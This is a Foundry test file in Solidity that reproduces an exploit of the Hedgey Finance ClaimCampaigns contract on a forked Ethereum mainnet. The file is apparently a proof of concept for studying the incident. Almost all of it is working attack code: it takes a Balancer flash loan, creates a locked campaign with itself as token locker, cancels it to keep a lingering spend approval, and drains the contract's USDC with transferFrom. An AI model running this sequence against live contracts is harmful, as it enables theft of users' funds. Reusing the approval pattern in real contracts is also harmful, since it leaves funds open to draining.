//SPDX-License-Identifier:MIT
pragma solidity 0.8.19;


import "forge-std/Test.sol";
import "src/interfaces/ICheatCodes.sol";
import "src/interfaces/IBalancer.sol";
import "src/interfaces/IERC20.sol";
import "src/interfaces/IClaimCampaigns.sol";
import "src/interfaces/IFlashLoanRecipient.sol";

/// @notice Exploit runs in 4 steps
// 1. Get flash loan from balancer
// 2. Create locked campaign with this address as both campaign manager & token locker
// 3. Instantly cancel the campaign
// 4. Transfer all balance from the claim campaigns to this contract

contract HedgeyFinanceExploit0324 is Test, IFlashLoanRecipient2 {

    uint256 mainnetForkId;
    ICheatCodes cheatCodes = ICheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address constant CLAIM_CAMPAIGNS = 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    IClaimCampaigns claimCampaign = IClaimCampaigns(CLAIM_CAMPAIGNS);
    IBalancerVault balancerVault = IBalancerVault(BALANCER_VAULT);
    IERC20 usdcToken = IERC20(USDC);

    function setUp() external {
        string memory mainnetRpc = cheatCodes.envString("MAINNET_RPC_URL");
        mainnetForkId = cheatCodes.createSelectFork(mainnetRpc, 19_687_889);

        cheatCodes.label(CLAIM_CAMPAIGNS, "Claim Campaigns");
        cheatCodes.label(USDC, "USDC");
        cheatCodes.label(BALANCER_VAULT, "Balancer Vault");
        cheatCodes.label(address(usdcToken), "USDC Token");
        cheatCodes.label(address(this), "Attacker Contract");

        // give max approval to claim campaigns
        usdcToken.approve(CLAIM_CAMPAIGNS, type(uint256).max);
        usdcToken.approve(BALANCER_VAULT, type(uint256).max);
    }

    function testState() external {
        emit log_named_decimal_uint("USDC Balance", usdcToken.balanceOf(CLAIM_CAMPAIGNS), 6);
    }

    function testHedgeyExploit() external {

        // Step 0 - Get USDC balance in Claim Campaigns
        uint256 usdcBalance = usdcToken.balanceOf(CLAIM_CAMPAIGNS);

        emit log_named_decimal_uint("USDC Balance of attacker (before attack):", usdcToken.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("USDC Balance of claim campaign (before attack):", usdcBalance, 6);        

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = USDC;
        amounts[0] = usdcBalance;

        // Step 1 - Get flash loan from balancer
        balancerVault.flashLoan(address(this), tokens, amounts, "");

        // Step 4 - now that we have the spend approval, simply transfer all balance from the claim campaigns to this contract
        usdcToken.transferFrom(CLAIM_CAMPAIGNS, address(this), usdcBalance);

        assertEq(usdcToken.balanceOf(address(this)), usdcBalance, "invalid attack");
        emit log_named_decimal_uint("USDC Balance of attacker (after attack):", usdcToken.balanceOf(address(this)), 6);        
        emit log_named_decimal_uint("USDC Balance of claim campaign (after attack):", usdcToken.balanceOf(CLAIM_CAMPAIGNS), 6);                
    }

     function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory ,
        bytes memory 
    ) external {
    // verify balance after receiving flash loan
    assertEq(usdcToken.balanceOf(address(this)), amounts[0], "Invalid flash loan amount");

    // Step 2 - create locked campaign with this address as both campaign manager & token locker
    claimCampaign.createLockedCampaign(
            "0x1234",
            Campaign({
                manager: address(this),
                token: tokens[0],
                amount: amounts[0],
                end: block.timestamp + 1 days,
                tokenLockup: TokenLockup.Locked,
                root: ""
            }),
            ClaimLockup({
                tokenLocker: address(this),
                start: block.timestamp,
                cliff: 0,
                period: 1 days,
                periods: 1
            }),
            Donation({
                tokenLocker: address(this),
                amount: 0,
                rate: 1,
                start: block.timestamp,
                cliff: 0,
                period: 1
            }));


            // Step 3 - Instantly cancel the campaign   
            claimCampaign.cancelCampaign("0x1234");

            // assert that there is enough balance to repay flash loan
            assertEq(usdcToken.balanceOf(address(this)), amounts[0], "Not enough to pay flash loan");            

           usdcToken.transfer(BALANCER_VAULT, amounts[0]);

    }

}